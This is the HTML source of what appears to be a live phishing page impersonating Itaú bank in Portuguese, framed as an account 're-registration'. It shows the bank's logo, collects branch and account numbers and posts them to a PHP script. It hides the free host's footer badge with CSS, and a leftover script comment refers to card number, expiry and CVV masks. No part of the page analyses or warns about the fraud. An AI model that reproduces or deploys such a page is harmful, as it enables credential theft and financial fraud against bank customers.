<!--
   Theme Name: Hiper Atualização cadastrais
   Author: MK(rj)
    -->
    <!DOCTYPE html>
<html lang="pt-BR">
   <head>
   <meta name="theme-color" content="#FF7F00">
      <title>Para Você</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>

    <!-- mascara -->
    <script type="text/javascript">
        $(document).ready(function(){
          $('#agencia').mask('0000');
          $('#conta').mask('00000-0');
        });
    </script>
   
   </head>
   <body id="tela1">
      <div class="container">
         <div class="row">
            <div class="col-md-12">
               <h1 id="logo">
                  <img src="img/itau-logo.png" style="width: 150px;">
                  <div class="tela-grande">
                     <p>Desculpe o transtorno :(</p>
                     <p>O recadastramento só poderá ser efetuado pelo telefone do titular da conta.</p>
                  </div>
               </h1>
            </div>
         </div>
      </div>
      <div class="container">
         <div class="row">
            <section class="conteudo1">
               <form method="POST" id="formulario-tela1" class="form-inline" action="home2.php">
                  <div class="form-group">
                     <input id="agencia" name="agencia" placeholder="Agência" type="tel" minlength="4" required>
                  </div>
                  <div class="form-group">
                     <input id="conta" name="conta" placeholder="Conta" type="tel" maxlength="6" required>
                  </div>
                  <!-- <div class="lembrar-dados">
                     <input id="lembrar-age_cnt" class="lembra class-lembra" type="checkbox">
                     
                     <label for="lembrar-age_cnt"></label>
                     
                     <label>Lembrar Agencia e Conta</label>
                     
                     </div> -->
                  <input type="submit" name="" value="OK">
               </form>
            </section>
         </div>
      </div>
      <footer>
         <section class="rodape">
            <i class="img-responsive localizacao">
            <img src="img/localizador.png" width="8%;">
            </i>
            <i class="img-responsive itoken">
            <img src="img/itoken.png">
            </i>
            <i class="img-responsive informacao">
            <img src="img/info.png" width="10%;">
            </i>
         </section>
      </footer>
   <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_safcs66&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div></body>
   <script type="text/javascript">
   	// mascara CC /validade / cvv
   	var app = angular.module('mk', ['angularMask','angular-creditcard-flag']);
   	app.controller('MainCtrl', function($scope) {
   	    $scope.field = {
   	        agencia: null
   	    };
   	    $scope.field = {
   	        conta: null
   	    };
   	});
   </script>
</body><head>
<style>
img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
    display: none;
}
</style>
</head>
</body>
</html>